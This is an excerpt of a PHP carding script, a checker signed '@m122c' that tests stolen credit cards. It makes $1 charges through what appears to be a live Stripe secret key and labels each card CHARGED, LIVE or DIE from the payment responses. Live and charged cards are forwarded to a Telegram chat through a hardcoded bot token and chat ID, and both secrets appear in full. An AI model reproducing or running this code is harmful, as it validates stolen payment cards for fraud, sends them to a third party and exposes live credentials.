...
$sk = 'sk_live_g35tYU6wS0rjNhOi9O2606Cl00xvReYnIA';
$lista = $_GET['lista'];
...
if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ BY @m122c<br>';
    $tg2 = 
"𝗛𝗘𝗖𝗞𝗘𝗥 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥✅

𝗖𝗖 ➔  <code>".$lista."</code>
𝗠𝗦𝗚 ➔ Charged 1$ ✅ BY @m122c";

$apiToken = '2017437224:AAF0UOlu_1Ptde4SwGhiNvLNRNiHjnByuc8';
$forward1 = ['chat_id' => '1113839912','text' => $tg2,'parse_mode' => 'HTML' ];
...
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ BY @m122c </span><br>';
}
...
elseif(strpos($result3,'"code": "incorrect_cvc"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect ✅ BY @m122c</span><br>';
$tg3 = 
"𝗛𝗘𝗖𝗞𝗘𝗥 𝗖𝗖𝗡 𝗦𝗘𝗡𝗗𝗘𝗥✅

𝗖𝗖 ➔  <code>".$lista."</code>
𝗠𝗦𝗚 ➔ CVV MISMATCH ✅ BY @m122c";
...
elseif(strpos($result3, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY @m122c</span> <br>';
}
...
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE @m122c</span><br>';
}
...
elseif(strpos($result1, "card_not_supported" )) {
    ...
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE @m122c</span><br>';
